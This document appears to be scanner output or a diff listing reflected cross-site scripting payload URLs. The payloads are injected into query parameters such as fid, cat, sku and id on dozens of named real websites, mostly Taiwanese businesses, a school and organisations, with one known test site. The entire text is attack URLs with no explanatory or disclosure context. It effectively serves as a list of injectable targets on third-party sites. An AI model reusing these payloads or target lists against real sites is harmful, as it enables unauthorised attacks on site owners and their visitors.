++	http://www.jg100.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.jg100.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.derjaan.com.tw/main.phpPatterns:
++	http://www.derjaan.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.derjaan.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.hunyi.com.tw/main.phpPatterns:
++	http://www.hunyi.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&pageNo="><script>alert('XSS');</script>&
++	http://www.hunyi.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&pageNo=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.chasme.org.tw/main.phpPatterns:
++	http://www.chasme.org.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.chasme.org.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.jinglebell.com.tw/main.phpPatterns:
++	http://www.jinglebell.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.jinglebell.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.chengjer.com.tw/main.phpPatterns:
++	http://www.chengjer.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.chengjer.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.24eshop.com.tw/main.phpPatterns:
++	http://www.24eshop.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.24eshop.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+cp.eces.ntpc.edu.tw/main.phpPatterns:
++	http://cp.eces.ntpc.edu.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://cp.eces.ntpc.edu.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+magazi-moto.chasme.com.tw/main.phpPatterns:
++	http://magazi-moto.chasme.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://magazi-moto.chasme.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+derjaan.chasme.com.tw/main.phpPatterns:
++	http://derjaan.chasme.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://derjaan.chasme.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.chian-y-f.com.tw/main.phpPatterns:
++	http://www.chian-y-f.com.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.chian-y-f.com.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.chunchin.com.cn/product_list.phpPatterns:
++	http://www.chunchin.com.cn/product_list.php?fid="><script>alert('XSS');</script>&
+--------------------------------------
+www.changhuaphoto.org.tw/main.phpPatterns:
++	http://www.changhuaphoto.org.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.changhuaphoto.org.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.chphoto.btb.tw/main.phpPatterns:
++	http://www.chphoto.btb.tw/main.php?fid="><script>alert('XSS');</script>&page_name="><script>alert('XSS');</script>&parent_id="><script>alert('XSS');</script>&
++	http://www.chphoto.btb.tw/main.php?fid=--><script>alert('XSS');</script><!--&page_name=--><script>alert('XSS');</script><!--&parent_id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+testphp.vulnweb.com/listproducts.phpPatterns:
++	http://testphp.vulnweb.com/listproducts.php?cat="><script>alert('XSS');</script>&
+--------------------------------------
+www.smtmax.com/category.phpPatterns:
++	http://www.smtmax.com/category.php?id="><script>alert('XSS');</script>&
+--------------------------------------
+filesgarage.com/category.phpPatterns:
++	https://filesgarage.com/category.php?catid="><script>alert('XSS');</script>&pg="><script>alert('XSS');</script>&
++	https://filesgarage.com/category.php?catid=--><script>alert('XSS');</script><!--&pg=--><script>alert('XSS');</script><!--&
+--------------------------------------
+faustiusa.com/products.phpPatterns:
++	http://faustiusa.com/products.php?cat="><script>alert('XSS');</script>&cat2="><script>alert('XSS');</script>&
++	http://faustiusa.com/products.php?cat=--><script>alert('XSS');</script><!--&cat2=--><script>alert('XSS');</script><!--&
+--------------------------------------
+waterdawgkustomz.com/products.phpPatterns:
++	http://waterdawgkustomz.com/products.php?cat=5&"><script>alert('XSS');</script>
++	http://waterdawgkustomz.com/products.php?cat="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.australiasigns.com.au/qsonline/products.phpPatterns:
++	http://www.australiasigns.com.au/qsonline/products.php?cat=23&"><script>alert('XSS');</script>
+--------------------------------------
+www.gebos.com/products.phpPatterns:
++	http://www.gebos.com/products.php?cat1="><script>alert('XSS');</script>&
++	http://www.gebos.com/products.php?cat1=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.alloyindustry.com/products.phpPatterns:
++	http://www.alloyindustry.com/products.php?cat="><script>alert('XSS');</script>&
++	http://www.alloyindustry.com/products.php?cat=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.qualitysportswear.ca/products.phpPatterns:
++	https://www.qualitysportswear.ca/products.php?cat="><script>alert('XSS');</script>&
++	https://www.qualitysportswear.ca/products.php?cat=--><script>alert('XSS');</script><!--&
+--------------------------------------
+weanimals.org/gallery.phpPatterns:
++	http://weanimals.org/gallery.php?id="><script>alert('XSS');</script>&
++	http://weanimals.org/gallery.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.farmtronics.com/products.phpPatterns:
++	http://www.farmtronics.com/products.php?cat=229&"><script>alert('XSS');</script>
+--------------------------------------
+www.powellandbonnell.com/products.phpPatterns:
++	https://www.powellandbonnell.com/products.php?cat="><script>alert('XSS');</script>&
++	https://www.powellandbonnell.com/products.php?cat=--><script>alert('XSS');</script><!--&
+--------------------------------------
+lazboythailand.com/news.phpPatterns:
++	https://lazboythailand.com/news.php?t="><script>alert('XSS');</script>&
++	https://lazboythailand.com/news.php?t=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.hickorycreekmill.com/product.phpPatterns:
++	http://www.hickorycreekmill.com/product.php?sku="><script>alert('XSS');</script>&cat="><script>alert('XSS');</script>&inv_store="><script>alert('XSS');</script>&
++	http://www.hickorycreekmill.com/product.php?sku=--><script>alert('XSS');</script><!--&cat=--><script>alert('XSS');</script><!--&inv_store=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.redbomb.com/products/product.phpPatterns:
++	http://www.redbomb.com/products/product.php?sku="><script>alert('XSS');</script>&
++	http://www.redbomb.com/products/product.php?sku=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.hickorycreekmill.com/product.phpPatterns:
++	http://www.hickorycreekmill.com/product.php?sku="><script>alert('XSS');</script>&type="><script>alert('XSS');</script>&cat="><script>alert('XSS');</script>&
++	http://www.hickorycreekmill.com/product.php?sku=--><script>alert('XSS');</script><!--&type=--><script>alert('XSS');</script><!--&cat=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.orcanetwork.org/Main/index.phpPatterns:
++	http://www.orcanetwork.org/Main/index.php?categories_file="><script>alert('XSS');</script>&
++	http://www.orcanetwork.org/Main/index.php?categories_file=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.getflexion.com/product.phpPatterns:
++	http://www.getflexion.com/product.php?sku="><script>alert('XSS');</script>&
++	http://www.getflexion.com/product.php?sku=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.snapon.co.jp/Configuration/product.phpPatterns:
++	https://www.snapon.co.jp/Configuration/product.php?sku="><script>alert('XSS');</script>&
++	https://www.snapon.co.jp/Configuration/product.php?sku=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.birkirkarafc.com/news.phpPatterns:
++	https://www.birkirkarafc.com/news.php?id="><script>alert('XSS');</script>&
++	https://www.birkirkarafc.com/news.php?id=--><script>alert('XSS');</script><!--&
+--------------------------------------
+examples.codecharge.com/Store/ProductDetail.phpPatterns:
++	http://examples.codecharge.com/Store/ProductDetail.php?product_id=13&"><script>alert('XSS');</script>
++	http://examples.codecharge.com/Store/ProductDetail.php?product_id="><script>alert('XSS');</script>&--><script>alert('XSS');</script><!--
+--------------------------------------
+www.shaadicardsbradford.co.uk/ProductList.phpPatterns:
++	https://www.shaadicardsbradford.co.uk/ProductList.php?cat=--><script>alert('XSS');</script><!--&
+--------------------------------------
+shop.juwelier-thomas.at/index.phpPatterns:
++	https://shop.juwelier-thomas.at/index.php?cat=--><script>alert('XSS');</script><!--&cPath=--><script>alert('XSS');</script><!--&product_list_next_page=--><script>alert('XSS');</script><!--&
+--------------------------------------
+www.getraenke-hauslieferung.de/index.phpPatterns:
++	https://www.getraenke-hauslieferung.de/index.php?cat="><script>alert('XSS');</script>&product_list_next_page="><script>alert('XSS');</script>&
++	https://www.getraenke-hauslieferung.de/index.php?cat=--><script>alert('XSS');</script><!--&product_list_next_page=--><script>alert('XSS');</script><!--&
+--------------------------------------
+brother.ally.de/index.phpPatterns:
++	http://brother.ally.de/index.php?cat="><script>alert('XSS');</script>&product_list_next_page="><script>alert('XSS');</script>&
++	http://brother.ally.de/index.php?cat=--><script>alert('XSS');</script><!--&product_list_next_page=--><script>alert('XSS');</script><!--&
+--------------------------------------
